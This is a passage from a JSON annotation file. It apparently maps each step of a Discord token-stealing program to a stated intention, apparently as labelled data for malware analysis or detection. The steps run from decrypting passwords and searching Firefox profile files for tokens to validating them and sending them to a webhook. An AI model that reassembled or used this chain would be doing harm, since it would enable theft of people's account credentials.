              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Decode decrypted password",
              "intention_id": "decode_decrypted_password"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.baseurl, headers={...}",
              "object_description": "Discord API endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Access remote data",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "r.status_code",
              "action_description": "Retrieves HTTP response status code",
              "action_id": "get_http_status",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Determine presence of valid authentication",
              "intention_id": "determine_valid_authentication_presence"
            },
            {
              "action_api": "r.json()",
              "action_description": "Deserializes JSON response body to Python object",
              "action_id": "deserialize_json_response",
              "object": "",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "self.roaming + \"\\Mozilla\\Firefox\\Profiles\"",
              "object_description": "Browser profile directory",
              "object_id": "browser_profile_directory",
              "intention_description": "Determine browser profile presence",
              "intention_id": "determine_browser_profile_presence"
            },
            {
              "action_api": "os.walk()",
              "action_description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
              "action_id": "path_special_operations",
              "object": "self.roaming + \"\\Mozilla\\Firefox\\Profiles\"",
              "object_description": "Browser profile directory",
              "object_id": "browser_profile_directory",
              "intention_description": "List Firefox profile files",
              "intention_id": "list_firefox_profile_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "f'{path}\\{_file}'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "self.regex, line",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract browser tokens",
              "intention_id": "extract_browser_tokens"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "'https://discord.com/api/v9/users/@me', headers={...}",
              "object_description": "Discord API endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Access remote data",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "r.json()",
              "action_description": "Deserializes JSON response body to Python object",
              "action_id": "deserialize_json_response",
              "object": "",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "DiscordWebhook()",
              "action_description": "Creates Discord webhook object",
              "action_id": "create_discord_webhook",
              "object": "__WEBHOOK__",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "DiscordEmbed()",
              "action_description": "Creates Discord embed object",
              "action_id": "create_discord_embed",
              "object": "",
              "object_description": "Serialized embed object",
              "object_id": "serialized_embed_object",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "embed.add_embed_field()",
              "action_description": "Adds field to Discord embed",
              "action_id": "add_discord_embed_field",
              "object": "name, value",
              "object_description": "Serialized embed object",
              "object_id": "serialized_embed_object",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "embed.set_thumbnail()",
              "action_description": "Sets thumbnail image for Discord embed",
              "action_id": "set_discord_thumbnail",
              "object": "url",
              "object_description": "Discord CDN URL",
              "object_id": "discord_cdn_url",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "embed.set_footer()",
              "action_description": "Sets footer for Discord embed",
              "action_id": "set_discord_footer",
              "object": "text, icon_url_url",
              "object_description": "Discord CDN URL",
              "object_id": "discord_cdn_url",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "webhook.add_embed()",
              "action_description": "Adds field to Discord embed",
              "action_id": "add_discord_embed_field",
              "object": "embed",
              "object_description": "Serialized embed object",
              "object_id": "serialized_embed_object",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "webhook.execute()",
              "action_description": "Sends message to Discord channel via webhook",
              "action_id": "send_discord_webhook",
              "object": "",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Send Discord tokens to server",
              "intention_id": "send_discord_tokens_server"
            }
          ]
        }
      ]
    }
  ]
}